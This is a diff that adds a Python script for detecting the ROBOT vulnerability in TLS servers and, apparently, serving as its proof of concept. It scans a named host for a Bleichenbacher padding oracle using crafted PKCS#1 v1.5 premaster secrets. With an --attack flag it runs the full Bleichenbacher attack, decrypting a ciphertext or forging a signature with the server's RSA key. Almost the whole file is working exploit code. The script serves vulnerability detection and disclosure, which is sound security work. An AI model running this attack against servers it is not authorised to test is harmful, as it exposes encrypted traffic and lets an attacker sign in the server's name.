@@ -1,0 +1,669 @@
+#!/usr/bin/env -S python3 -W ignore::DeprecationWarning
+
+# Detection and proof of concept for the ROBOT attack
+# https://robotattack.org/
+#
+# This code is licensed as CC0.
+
+# standard modules
+import math
+import time
+import sys
+import socket
+import os
+import argparse
+import ssl
+import ipaddress
+import gmpy2
+from cryptography import x509
+from cryptography.hazmat.backends import default_backend
+
+
+def build_client_hello(hostname, tls_version=(3, 3), cipher_suites=None, record_version=(3, 1)):
+    """Build a minimal ClientHello with optional SNI and signature algorithms."""
+    if not cipher_suites:
+        raise ValueError("At least one cipher suite must be provided")
+
+    def vb(num, length):
+        return num.to_bytes(length, "big")
+
+    # ClientHello body pieces
+    ch_body = bytearray()
+    ch_body += vb(tls_version[0] << 8 | tls_version[1], 2)
+    ch_body += os.urandom(32)
+
+    # Session ID (empty)
+    ch_body += b"\x00"
+
+    # Cipher suites
+    suites = b"".join(vb(cs, 2) for cs in cipher_suites)
+    ch_body += vb(len(suites), 2) + suites
+
+    # Compression methods (null only)
+    ch_body += b"\x01\x00"
+
+    extensions = bytearray()
+
+    # SNI
+    if hostname:
+        try:
+            name_bytes = hostname.encode("idna")
+        except UnicodeError:
+            name_bytes = b""
+        if name_bytes and len(name_bytes) <= 0xffff:
+            sni_list = b"\x00" + vb(len(name_bytes), 2) + name_bytes
+            sni_ext_data = vb(len(sni_list), 2) + sni_list
+            extensions += vb(0x0000, 2) + vb(len(sni_ext_data), 2) + sni_ext_data
+
+    # Signature algorithms (matches previous hardcoded list)
+    sig_algs = bytearray.fromhex(
+        "0601 0602 0603 0501 0502 0503 0401 0402 0403 0301 0302 0303 0201 0202 0203".replace(" ", "")
+    )
+    sig_body = vb(len(sig_algs), 2) + sig_algs
+    extensions += vb(0x000d, 2) + vb(len(sig_body), 2) + sig_body
+
+    ch_body += vb(len(extensions), 2) + extensions
+
+    # Handshake header
+    handshake = bytearray(b"\x01")  # ClientHello
+    handshake += vb(len(ch_body), 3)
+    handshake += ch_body
+
+    # TLS record header
+    record = bytearray(b"\x16")
+    record += vb(record_version[0] << 8 | record_version[1], 2)
+    record += vb(len(handshake), 2)
+    record += handshake
+
+    return bytes(record)
+
+ccs = bytearray.fromhex("000101")
+enc = bytearray.fromhex("005091a3b6aaa2b64d126e5583b04c113259c4efa48e40a19b8e5f2542c3b1d30f8d80b7582b72f08b21dfcbff09d4b281676a0fb40d48c20c4f388617ff5c00808a96fbfe9bb6cc631101a6ba6b6bc696f0")
+
+MSG_FASTOPEN = 0x20000000
+# set to true if you want to generate a signature or if the first ciphertext is not PKCS#1 v1.5 conform
+EXECUTE_BLINDING = True
+
+
+def get_rsa_from_server(server, port):
+    def is_ip_address(value):
+        try:
+            ipaddress.ip_address(value)
+            return True
+        except ValueError:
+            return False
+
+    def connect_once(use_sni=True, allow_legacy_renegotiation=False):
+        ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        ctx.set_ciphers("RSA")
+        if allow_legacy_renegotiation and hasattr(ssl, "OP_LEGACY_SERVER_CONNECT"):
+            ctx.options |= ssl.OP_LEGACY_SERVER_CONNECT
+        with socket.create_connection((server, port)) as sock:
+            server_hostname = server if use_sni else None
+            with ctx.wrap_socket(sock, server_hostname=server_hostname) as ssock:
+                cert_raw = ssock.getpeercert(binary_form=True)
+                cert_dec = x509.load_der_x509_certificate(cert_raw, default_backend())
+                return (
+                    ssock.cipher(),
+                    cert_dec.public_key().public_numbers().n,
+                    cert_dec.public_key().public_numbers().e,
+                    use_sni,
+                    allow_legacy_renegotiation,
+                )
+
+    supports_legacy_reneg_flag = hasattr(ssl, "OP_LEGACY_SERVER_CONNECT")
+    default_use_sni = not is_ip_address(server)
+    attempts = [("default", default_use_sni, False)]
+    attempted = set()
+    last_ssl_error = None
+
+    try:
+        while attempts:
+            attempt_label, use_sni, allow_legacy_renegotiation = attempts.pop(0)
+            key = (use_sni, allow_legacy_renegotiation)
+            if key in attempted:
+                continue
+            attempted.add(key)
+            if attempt_label != "default" and not args.quiet:
+                print(f"Retrying TLS handshake ({attempt_label})")
+            try:
+                return connect_once(
+                    use_sni=use_sni,
+                    allow_legacy_renegotiation=allow_legacy_renegotiation,
+                )
+            except ssl.SSLError as e:
+                last_ssl_error = e
+                error_str = str(e)
+                if "TLSV1_UNRECOGNIZED_NAME" in error_str and use_sni:
+                    attempts.append(("without SNI", False, allow_legacy_renegotiation))
+                if (
+                    "UNSAFE_LEGACY_RENEGOTIATION_DISABLED" in error_str
+                    and not allow_legacy_renegotiation
+                    and supports_legacy_reneg_flag
+                ):
+                    attempts.append(("with legacy renegotiation", use_sni, True))
+                    if use_sni:
+                        attempts.append(("without SNI and with legacy renegotiation", False, True))
+        if last_ssl_error is not None:
+            raise last_ssl_error
+    except ssl.SSLError as e:
+        if not args.quiet:
+            print("Cannot connect to server: %s" % e)
+            print("Server does not seem to allow connections with TLS_RSA (this is ideal).")
+            if "TLSV1_UNRECOGNIZED_NAME" in str(e):
+                print("Hint: server rejected the SNI name. This script now retries without SNI.")
+            if "UNSAFE_LEGACY_RENEGOTIATION_DISABLED" in str(e):
+                print("Hint: server uses legacy renegotiation and OpenSSL blocked it.")
+        if args.csv:
+            # TODO: We could add an extra check that the server speaks TLS without RSA
+            print("NORSA,%s,%s,,,,,,,," % (args.host, ip))
+        # s.close()
+        sys.exit(0)
+    except (ConnectionRefusedError, socket.timeout) as e:
+        if not args.quiet:
+            print("Cannot connect to server: %s" % e)
+            print("There seems to be no TLS on this host/port.")
+        if args.csv:
+            print("NOTLS,%s,%s,,,,,,,," % (args.host, ip))
+        sys.exit(0)
+
+
+def oracle(pms, messageflow=False):
+    global cke_version
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        if not enable_fastopen:
+            s.connect((ip, args.port))
+            s.sendall(ch)
+        else:
+            s.sendto(ch, MSG_FASTOPEN, (ip, args.port))
+        s.settimeout(timeout_flow if messageflow else timeout_standard)
+        buf = bytearray.fromhex("")
+        i = 0
+        bend = 0
+        while True:
+            # we try to read twice
+            while i + 5 > bend:
+                buf += s.recv(4096)
+                bend = len(buf)
+            # this is the record size
+            psize = buf[i + 3] * 256 + buf[i + 4]
+            # if the size is 2, we received an alert
+            if (psize == 2):
+                # Print the alert and close the connection
+                alert_level = buf[i+5] # Example: 2 = fatal
+                alert_description = buf[i+6] # Example: 40 = handshake_failure
+                s.close()
+                return ("Alert(%i, %i) after ClientHello" % (alert_description, alert_level))
+            # try to read further record data
+            while i + psize + 5 > bend:
+                buf += s.recv(4096)
+                bend = len(buf)
+            # check whether we have already received a ClientHelloDone
+            if (buf[i + 5] == 0x0e) or (buf[bend - 4] == 0x0e):
+                break
+            i += psize + 5
+        cke_version = buf[9:11]
+        s.send(bytearray(b'\x16') + cke_version)
+        s.send(cke_2nd_prefix)
+        s.send(pms)
+        if not messageflow:
+            s.send(bytearray(b'\x14') + cke_version + ccs)
+            s.send(bytearray(b'\x16') + cke_version + enc)
+        try:
+            alert = s.recv(4096)
+            s.close()
+            if len(alert) == 0:
+                # return "No response"
+                return ("No data received from server")
+            if alert[0] == 0x15:
+                if len(alert) < 7:
+                    return ("TLS alert was truncated (%s)" % (repr(alert)))
+                return ("TLS alert %i of length %i" % (alert[6], len(alert)))
+                # return ("TLS alert %i" % alert[6])
+            else:
+                return "Received something other than an alert (%s)" % (alert[0:10])
+        except ConnectionResetError as e:
+            s.close()
+            # return "No response"
+            return "ConnectionResetError"
+        except socket.timeout:
+            s.close()
+            # return "No response"
+            return ("Timeout waiting for alert")
+        s.close()
+    except Exception as e:
+        # exc_type, exc_obj, exc_tb = sys.exc_info()
+        # print("line %i", exc_tb.tb_lineno)
+        # print ("Exception received: " + str(e))
+        s.close()
+        return str(e)
+
+
+def BleichenbacherOracle(cc):
+    global count
+    global countvalid
+    count = count + 1
+    if count % 1000 == 0:
+        print(count, "oracle queries")
+    tmp = hex(cc).rstrip("L").lstrip("0x").rjust(modulus_bits // 4, '0')
+    pms = bytearray.fromhex(tmp)
+    o = oracle(pms, messageflow=flow)
+    if o == oracle_good:
+        # Query the oracle again to make sure it is real...
+        o = oracle(pms, messageflow=flow)
+        if o == oracle_good:
+            countvalid += 1
+            return True
+        else:
+            print("Inconsistent result from oracle.")
+            return False
+    else:
+        return False
+
+
+parser = argparse.ArgumentParser(description="Bleichenbacher attack")
+parser.add_argument("host", help="Target host")
+group = parser.add_mutually_exclusive_group()
+group.add_argument("-r", "--raw", help="Message to sign or decrypt (raw hex bytes)")
+group.add_argument("-m", "--message", help="Message to sign (text)")
+parser.add_argument("s0", nargs="?", default="1", help="Start for s0 value (default 1)")
+parser.add_argument("limit", nargs="?", default="-1", help="Start for limit value (default -1)")
+parser.add_argument("-a", "--attack", help="Try to attack if vulnerable", action="store_true")
+parser.add_argument("-p", "--port", metavar='int', default=443, help="TCP port")
+parser.add_argument("-t", "--timeout", default=5, type=float, help="Timeout applied to both flows unless overridden")
+parser.add_argument("--timeout-standard", type=float, help="Timeout (seconds) when using standard message flow")
+parser.add_argument("--timeout-flow", type=float, help="Timeout (seconds) when using shortened/message flow")
+parser.add_argument("--retry-flow", dest="retry_flow", action="store_true", default=True, help="Retry with messageflow=True if standard results are inconclusive (default: retry)")
+parser.add_argument("--no-retry-flow", dest="retry_flow", action="store_false", help="Do not retry with messageflow=True; only run standard flow")
+parser.add_argument("-q", "--quiet", help="Quiet", action="store_true")
+groupcipher = parser.add_mutually_exclusive_group()
+groupcipher.add_argument("--gcm", help="Use only GCM/AES256.", action="store_true")
+groupcipher.add_argument("--cbc", help="Use only CBC/AES128.", action="store_true")
+parser.add_argument("--csv", help="Output CSV format", action="store_true")
+args = parser.parse_args()
+
+args.port = int(args.port)
+timeout_standard = float(args.timeout_standard if args.timeout_standard is not None else args.timeout)
+timeout_flow = float(args.timeout_flow if args.timeout_flow is not None else timeout_standard)
+
+def build_probe_client_hello(hostname_for_sni):
+    if args.gcm:
+        return build_client_hello(hostname_for_sni, cipher_suites=[0x009c])
+    if args.cbc:
+        return build_client_hello(hostname_for_sni, cipher_suites=[0x002f])
+    return build_client_hello(
+        hostname_for_sni,
+        cipher_suites=[0x009d, 0x003d, 0x0035, 0x009c, 0x003c, 0x002f, 0x000a, 0x00ff],
+    )
+
+if not args.quiet:
+    print("Connecting to %s:%i" % (args.host, args.port))
+
+# We only enable TCP fast open if the Linux proc interface exists
+enable_fastopen = os.path.exists("/proc/sys/net/ipv4/tcp_fastopen")
+
+try:
+    ip = socket.gethostbyname(args.host)
+except socket.gaierror as e:
+    if not args.quiet:
+        print("Cannot resolve host: %s" % e)
+    if args.csv:
+        print("NODNS,%s,,,,,,,,," % (args.host))
+
+    sys.exit(0)
+
+
+if not args.quiet:
+    print("Scanning host %s ip %s port %i" % (args.host, ip, args.port))
+
+negotiated_cipher, N, e, use_sni, used_legacy_renegotiation = get_rsa_from_server(args.host, args.port)
+ch = build_probe_client_hello(args.host if use_sni else None)
+modulus_bits = int(math.ceil(math.log(N, 2)))
+modulus_bytes = (modulus_bits + 7) // 8
+if not args.quiet:
+    if not use_sni:
+        print("Using no-SNI mode for probe handshakes.")
+    if used_legacy_renegotiation:
+        print("Enabled legacy renegotiation compatibility for certificate retrieval.")
+    # print("RSA N: %s" % hex(N))
+    # print("RSA e: %s" % hex(e))
+    print(f"Negotiated cipher: {negotiated_cipher}")
+    print("Modulus size: %i bits, %i bytes" % (modulus_bits, modulus_bytes))
+
+cke_2nd_prefix = bytearray.fromhex("{0:0{1}x}".format(modulus_bytes + 6, 4) + "10" + "{0:0{1}x}".format(modulus_bytes + 2, 6) + "{0:0{1}x}".format(modulus_bytes, 4))
+# print(cke_2nd_prefix)
+# pad_len is length in hex chars, so bytelen * 2
+pad_len = (modulus_bytes - 48 - 3) * 2
+rnd_pad = ("abcd" * (pad_len // 2 + 1))[:pad_len]
+
+rnd_pms = "aa112233445566778899112233445566778899112233445566778899112233445566778899112233445566778899"
+pms_good_in = int("0002" + rnd_pad + "00" + "0303" + rnd_pms, 16)
+# wrong first two bytes
+pms_bad_in1 = int("4117" + rnd_pad + "00" + "0303" + rnd_pms, 16)
+# 0x00 on a wrong position, also trigger older JSSE bug
+pms_bad_in2 = int("0002" + rnd_pad + "11" + rnd_pms + "0011", 16)
+# no 0x00 in the middle
+pms_bad_in3 = int("0002" + rnd_pad + "11" + "1111" + rnd_pms, 16)
+# wrong version number (according to Klima / Pokorny / Rosa paper)
+pms_bad_in4 = int("0002" + rnd_pad + "00" + "0202" + rnd_pms, 16)
+
+pms_good = int(gmpy2.powmod(pms_good_in, e, N)).to_bytes(modulus_bytes, byteorder="big")
+pms_bad1 = int(gmpy2.powmod(pms_bad_in1, e, N)).to_bytes(modulus_bytes, byteorder="big")
+pms_bad2 = int(gmpy2.powmod(pms_bad_in2, e, N)).to_bytes(modulus_bytes, byteorder="big")
+pms_bad3 = int(gmpy2.powmod(pms_bad_in3, e, N)).to_bytes(modulus_bytes, byteorder="big")
+pms_bad4 = int(gmpy2.powmod(pms_bad_in4, e, N)).to_bytes(modulus_bytes, byteorder="big")
+
+
+def run_oracle_set(messageflow):
+    return {
+        "good": oracle(pms_good, messageflow=messageflow),
+        "bad1": oracle(pms_bad1, messageflow=messageflow),
+        "bad2": oracle(pms_bad2, messageflow=messageflow),
+        "bad3": oracle(pms_bad3, messageflow=messageflow),
+        "bad4": oracle(pms_bad4, messageflow=messageflow),
+    }
+
+
+def identical_results(results):
+    values = list(results.values())
+    return all(value == values[0] for value in values[1:])
+
+
+def format_result_set(label, results, ran):
+    if not ran or results is None:
+        return f"{label}: not run"
+    return f"{label}: good={results['good']}, bad1={results['bad1']}, bad2={results['bad2']}, bad3={results['bad3']}, bad4={results['bad4']}"
+
+
+standard_results = run_oracle_set(messageflow=False)
+oracle_results = standard_results
+flow_results = None
+flow_attempted = False
+flow = False
+
+if identical_results(standard_results):
+    if not args.quiet:
+        print("Identical results (%s), standard flow oracle not found" % standard_results["good"])
+    if args.retry_flow:
+        flow_attempted = True
+        if not args.quiet:
+            print("Retrying with changed messageflow")
+        flow_results = run_oracle_set(messageflow=True)
+        if identical_results(flow_results):
+            if not args.quiet and not args.csv:
+                summary_line = " | ".join(
+                    [
+                        format_result_set("standard", standard_results, ran=True),
+                        format_result_set("messageflow", flow_results, ran=True),
+                        "used=none (no working oracle)",
+                    ]
+                )
+                print(summary_line)
+                print("Identical results (%s), no working oracle found" % flow_results["good"])
+                print("NOT VULNERABLE!")
+            if args.csv:
+                print("SAFE,%s,%s,,,,%s,%s,%s,%s,%s" % (args.host, ip, flow_results["good"], flow_results["bad1"], flow_results["bad2"], flow_results["bad3"], flow_results["bad4"]))
+            sys.exit(0)
+        else:
+            flow = True
+            oracle_results = flow_results
+    else:
+        if not args.quiet and not args.csv:
+            summary_line = " | ".join(
+                [
+                    format_result_set("standard", standard_results, ran=True),
+                    format_result_set("messageflow", None, ran=False),
+                    "used=standard-only (flow retry disabled)",
+                ]
+            )
+            print(summary_line)
+            print("No working oracle found with standard flow and flow retry disabled")
+            print("NOT VULNERABLE!")
+        if args.csv:
+            print("SAFE,%s,%s,,,,%s,%s,%s,%s,%s" % (args.host, ip, standard_results["good"], standard_results["bad1"], standard_results["bad2"], standard_results["bad3"], standard_results["bad4"]))
+        sys.exit(0)
+
+# Re-checking all oracles to avoid unreliable results
+oracle_good_verify = oracle(pms_good, messageflow=flow)
+oracle_bad_verify1 = oracle(pms_bad1, messageflow=flow)
+oracle_bad_verify2 = oracle(pms_bad2, messageflow=flow)
+oracle_bad_verify3 = oracle(pms_bad3, messageflow=flow)
+oracle_bad_verify4 = oracle(pms_bad4, messageflow=flow)
+
+if (
+    oracle_results["good"] != oracle_good_verify
+    or oracle_results["bad1"] != oracle_bad_verify1
+    or oracle_results["bad2"] != oracle_bad_verify2
+    or oracle_results["bad3"] != oracle_bad_verify3
+    or oracle_results["bad4"] != oracle_bad_verify4
+):
+    if not args.quiet:
+        print("Getting inconsistent results, aborting.")
+        print("Result of good request:                        %s        %s" % (oracle_results["good"], oracle_good_verify))
+        print("Result of bad request 1 (wrong first bytes):   %s        %s" % (oracle_results["bad1"], oracle_bad_verify1))
+        print("Result of bad request 2 (wrong 0x00 position): %s        %s" % (oracle_results["bad2"], oracle_bad_verify2))
+        print("Result of bad request 3 (missing 0x00):        %s        %s" % (oracle_results["bad3"], oracle_bad_verify3))
+        print("Result of bad request 4 (bad TLS version):     %s        %s" % (oracle_results["bad4"], oracle_bad_verify4))
+    if args.csv:
+        print(
+            "INCONSISTENT,%s,%s,,,,%s,%s,%s,%s,%s"
+            % (
+                args.host,
+                ip,
+                oracle_results["good"],
+                oracle_results["bad1"],
+                oracle_results["bad2"],
+                oracle_results["bad3"],
+                oracle_results["bad4"],
+            )
+        )
+    quit()
+
+oracle_good = oracle_results["good"]
+oracle_bad1 = oracle_results["bad1"]
+oracle_bad2 = oracle_results["bad2"]
+oracle_bad3 = oracle_results["bad3"]
+oracle_bad4 = oracle_results["bad4"]
+
+summary_line = " | ".join(
+    [
+        format_result_set("standard", standard_results, ran=True),
+        format_result_set("messageflow", flow_results, ran=flow_attempted),
+        "used=%s" % ("messageflow" if flow else "standard"),
+    ]
+)
+if not args.quiet and not args.csv:
+    print(summary_line)
+
+# If the response to the invalid PKCS#1 request (oracle_bad1) is equal to both
+# requests starting with 0002, we have a weak oracle. This is because the only
+# case where we can distinguish valid from invalid requests is when we send
+# correctly formatted PKCS#1 message with 0x00 on a correct position. This
+# makes our oracle weak
+if (oracle_bad1 == oracle_bad2 == oracle_bad3):
+    oracle_strength = "weak"
+    if not args.quiet:
+        print("The oracle is weak, the attack would take too long")
+else:
+    oracle_strength = "strong"
+    if not args.quiet:
+        print("The oracle is strong, real attack is possible")
+
+if flow:
+    flowt = "shortened"
+else:
+    flowt = "standard"
+
+if cke_version[0] == 3 and cke_version[1] == 0:
+    tlsver = "SSLv3"
+elif cke_version[0] == 3 and cke_version[1] == 1:
+    tlsver = "TLSv1.0"
+elif cke_version[0] == 3 and cke_version[1] == 2:
+    tlsver = "TLSv1.1"
+elif cke_version[0] == 3 and cke_version[1] == 3:
+    tlsver = "TLSv1.2"
+else:
+    tlsver = "TLS raw version %i/%i" % (cke_version[0], cke_version[1])
+
+if args.csv:
+    print("VULNERABLE,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s" % (args.host, ip, tlsver, oracle_strength, flowt, oracle_good, oracle_bad1, oracle_bad2, oracle_bad3, oracle_bad4))
+else:
+    print("VULNERABLE! Oracle (%s) found on %s/%s, %s, %s message flow: %s/%s (%s / %s / %s)" % (oracle_strength, args.host, ip, tlsver, flowt, oracle_good, oracle_bad1, oracle_bad2, oracle_bad3, oracle_bad4))
+
+if not args.quiet:
+    print("Result of good request:                        %s" % oracle_good)
+    print("Result of bad request 1 (wrong first bytes):   %s" % oracle_bad1)
+    print("Result of bad request 2 (wrong 0x00 position): %s" % oracle_bad2)
+    print("Result of bad request 3 (missing 0x00):        %s" % oracle_bad3)
+    print("Result of bad request 4 (bad TLS version):     %s" % oracle_bad4)
+
+# Only continue if we want to attack
+if not args.attack:
+    sys.exit(0)
+
+
+B = int("0001" + "00" * (modulus_bytes - 2), 16)
+
+if args.raw:
+    C = int(args.raw, 16)
+else:
+    if not args.message:
+        msg = "This message was signed with a Bleichenbacher oracle."
+        print('No message given, will sign "This message was signed with a Bleichenbacher oracle."')
+    else:
+        msg = args.message
+    C = int("0001" + "ff" * (modulus_bytes - len(msg) - 3) + "00" + "".join("{:02x}".format(ord(c)) for c in msg), 16)
+
+
+################################################################################
+# define Bleichenbacher Oracle
+count = 0
+countvalid = 0
+
+print("Using the following ciphertext: ", hex(C))
+
+starttime = time.time()
+
+a = int(2 * B)
+b = int(3 * B - 1)
+
+s0 = int(args.s0)
+limit = int(args.limit)
+c0 = C
+# Step 1: Blinding
+print("Searching for the first valid ciphertext starting %i" % s0)
+if (EXECUTE_BLINDING):
+    while not BleichenbacherOracle(c0):
+        s0 = s0 + 1
+        c0 = (int(gmpy2.powmod(s0, e, N)) * C) % N
+        if (limit != -1) and s0 > limit:
+            quit()
+    print(" -> Found s0: ", s0)
+
+
+M = set()
+M.add((a, b))
+Mnew = set()
+Mnext = set()
+previntervalsize = 0
+i = 1
+while True:
+
+    # find pairs r,s such that m*s % N = m*s-r*N is PKCS conforming
+    # 2.a)
+    if i == 1:
+        s = N // (3 * B)
+        cc = (int(gmpy2.powmod(s, e, N)) * c0) % N
+        while not BleichenbacherOracle(cc):
+            s += 1
+            cc = (int(gmpy2.powmod(s, e, N)) * c0) % N
+
+    # 2.b)
+    if not i == 1 and len(M) >= 2:
+        s += 1
+        cc = (int(gmpy2.powmod(s, e, N)) * c0) % N
+        while not BleichenbacherOracle(cc):
+            s += 1
+            cc = (int(gmpy2.powmod(s, e, N)) * c0) % N
+
+    # 2.c)
+    if not i == 1 and len(M) == 1:
+        a, b = M.pop()
+        M.add((a, b))
+        r = 2 * (b * s - 2 * B) // N
+        s = -(-(2 * B + r * N // b))
+        cc = (int(gmpy2.powmod(s, e, N)) * c0) % N
+        while not BleichenbacherOracle(cc):
+            s += 1
+            if s > ((3 * B + r * N) // a):
+                r += 1
+                s = -(-(2 * B + r * N) // b)
+            cc = (int(gmpy2.powmod(s, e, N)) * c0) % N
+
+    # compute all possible r, depending on the known bounds on m.
+    # Use that 2*B+r*N <= ms <= 3*B-1+r*N
+    # is equivalent to (a*s-3*B-1)/N <= r <= (b*s-2*B)/N
+    # 3.
+    for MM in M:
+        a, b = MM
+        rmax = (b * s - 2 * B) // N
+        rmin = -(-(a * s - 3 * B - 1) // N)
+        # for all possible pairs (s,r) we obtain bounds
+        # (2*B+r*N)/s) <= m <= (3*B+1+r*N)/s) on m.
+        # Add bounds only if they make sense, i.e., if a < b.
+        for r in range(rmin, rmax + 1):
+            anew = (2 * B + r * N) // s
+            bnew = -(-(3 * B + 1 + r * N) // s)
+            if anew < bnew:
+                Mnew.add((anew, bnew))
+
+    # Keep only intervals which are compatible with previous intervals
+    Mnext.clear()
+    for MMnew in Mnew:
+        anew, bnew = MMnew
+        for MM in M:
+            a, b = MM
+            if (bnew <= b and bnew >= a) or (anew >= a and anew <= b) or (anew >= a and bnew <= b and anew <= bnew) or (anew <= a and bnew >= b):
+                Mnext.add((max([a, anew]), min([b, bnew])))
+
+    M.clear()
+    Mnew.clear()
+    M |= Mnext
+
+    if len(M) == 1:
+        a, b = M.pop()
+        M.add((a, b))
+        intervalsize = int(math.ceil(math.log(b - a, 2)))
+        if not intervalsize == previntervalsize:
+            previntervalsize = intervalsize
+            print(count, "oracle queries, Interval size:", intervalsize, "bit.")
+        if intervalsize < 10:
+            break
+
+    i += 1
+
+print
+print("Starting exhaustive search on remaining interval")
+
+print("min: ", hex(a))
+print("max: ", hex(b))
+
+while not c0 == int(gmpy2.powmod(a, e, N)):
+    a += 1
+
+print("C:      ", hex(C))
+print("result: ", hex(a))
+
+if s0 != 1:
+    x = int(gmpy2.invert(s0, N))
+    res = (x * a) % N
+    print("result after unblinding: ", hex(res))
+
+stoptime = time.time()
+print("Time elapsed:", stoptime - starttime, "seconds (=", (stoptime - starttime) / 60, "minutes)")
+print("Modulus size:", int(math.ceil(math.log(N, 2))), "bit. About", (stoptime - starttime) / math.ceil(math.log(N, 2)), "seconds per bit.")
+print(count, "oracle queries performed,", countvalid, "valid ciphertexts.")
